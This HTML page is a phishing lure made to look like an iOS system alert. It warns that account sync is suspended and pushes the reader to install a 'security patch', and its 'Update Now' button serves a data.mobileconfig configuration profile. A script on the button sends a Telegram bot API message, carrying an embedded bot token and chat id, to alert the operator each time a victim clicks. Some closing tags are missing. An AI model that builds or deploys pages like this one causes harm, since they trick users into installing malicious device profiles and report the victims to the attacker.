<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">

        body { font-family: -apple-system, sans-serif; background: #f2f2f7; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .alert-box { background: white; width: 270px; border-radius: 14px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.1); overflow: hidden; }

        .title { font-weight: 600; font-size: 17px; margin-bottom: 5px; }
        .msg { font-size: 13px; color: #333; line-height: 1.4; }
        .btn-row { border-top: 0.5px solid #c8c8c8; display: flex; }
        .btn { color: #007aff; text-decoration: none; padding: 12px; flex: 1; font-size: 17px; font-weight: 500; }
        .btn:active { background: #e5e5e5; }
    </style>
</head>
<body>
    <div class="alert-box">
        <div class="content">
            <div class="title">Account Deactivation</div>
            <div class="msg">Your account sync has been suspended. Install the security patch to prevent data loss.</div>
        </div>
        <div class="btn-row">
            <a href="data.mobileconfig" class="btn" onclick="notify()">Update Now</a>
        </div>
    </div>
    <script>
        function notify() {
            fetch("https://api.telegram.org/bot8662750137:AAGEIPealqUPso3hFzdCJrUZln684PaVX3k/sendMessage?chat_id=8639892987&text=Target_Triggered_Emergency_Update_🚀");
        }

</html>
